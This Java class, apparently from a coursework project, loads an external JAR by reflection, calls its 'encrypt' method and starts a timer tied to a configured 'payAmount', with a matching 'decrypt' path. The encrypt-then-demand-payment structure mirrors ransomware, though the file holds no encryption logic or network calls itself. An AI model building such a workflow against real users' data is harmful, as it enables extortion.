package S01;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CryptoManager {
    private static ThreadTimer timerTask;
    private static ExecutorService executor;

    @SuppressWarnings("unchecked")
    public static void launchEn(){

        Object port = null;
        Method launchMethod = null;

        try{
            Object instance;
            URL[] urls = {new File(Configuration.instance.nameOfJavaArchive).toURI().toURL()};
            URLClassLoader urlClassLoader = new URLClassLoader(urls, CryptoManager.class.getClassLoader());
            Class clazz = Class.forName(Configuration.instance.nameOfClass, true, urlClassLoader);
            instance = clazz.getMethod("getInstance").invoke(null);
            port = clazz.getDeclaredField("port").get(instance);
            launchMethod = port.getClass().getMethod("encrypt");
            launchMethod.invoke(port);

            executor = Executors.newFixedThreadPool(1); //Thread Starten
            timerTask = new ThreadTimer(Configuration.instance.payAmount);
            executor.execute(timerTask);

        }catch (Exception e){
            e.printStackTrace();
        }

    }


    @SuppressWarnings("unchecked")
    public static void launchDec(){

        Object port = null;
        Method launchMethod = null;

        try{
            Object instance;
            URL[] urls = {new File(Configuration.instance.nameOfJavaArchive).toURI().toURL()};
            URLClassLoader urlClassLoader = new URLClassLoader(urls, CryptoManager.class.getClassLoader());
            Class clazz = Class.forName(Configuration.instance.nameOfClass, true, urlClassLoader);
            instance = clazz.getMethod("getInstance").invoke(null);
            port = clazz.getDeclaredField("port").get(instance);
            launchMethod = port.getClass().getMethod("decrypt");
            launchMethod.invoke(port);

            executor.shutdown(); //Beende Thread

        }catch (Exception e){
            e.printStackTrace();
        }
    }


    public static ThreadTimer getTimerTask(){
        return timerTask;
    }



}
